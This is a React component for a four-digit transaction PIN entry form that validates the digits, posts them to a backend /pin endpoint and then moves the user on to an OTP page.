import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/pin.css"; // Assuming you'll add the styles here
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

// Schema for validation
const schema = yup.object().shape({
  pin: yup
    .string()
    .matches(/^\d{4}$/, "PIN must be exactly 4 digits")
    .required("PIN is required"),
});

const Pin = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [pin, setPin] = useState(new Array(4).fill(""));
  const [loading, setLoading] = useState(false);

  // Handle input changes and focus shifts
  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return; // Only accept digits

    const newPin = [...pin];
    newPin[index] = value;
    setPin(newPin);

    if (index < 3 && value !== "") {
      document.getElementById(`pin-${index + 1}`).focus(); // Move to next input
    }

    setValue("pin", newPin.join("")); // Set pin value for validation
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/pin`, data)
      .then((response) => {
        console.log(response.data);
        navigate("/otp"); // Navigate to OTP page on success
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="pin">
      <div className="pin-container">
        <div className="pin-header">
          <h2>Enter 4-Digit Transaction PIN</h2>
          <p>We just want to make sure it's you <span role="img" aria-label="lock">🔒</span></p>
        </div>

        <form onSubmit={handleSubmit(submitForm)} className="pin-form">
          <div className="pin-input-group">
            {pin.map((data, index) => (
              <input
                key={index}
                id={`pin-${index}`}
                type="password"
                maxLength="1"
                value={data}
                onChange={(e) => handleChange(e.target, index)}
                onFocus={(e) => e.target.select()}
                className="pin-input"
                inputMode="numeric"
              />
            ))}
          </div>

          <FormErrMsg errors={errors} inputName="pin" />

          <button type="submit" className="submit-btn" disabled={loading}>
            {loading ? "Loading..." : "Submit"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default Pin;
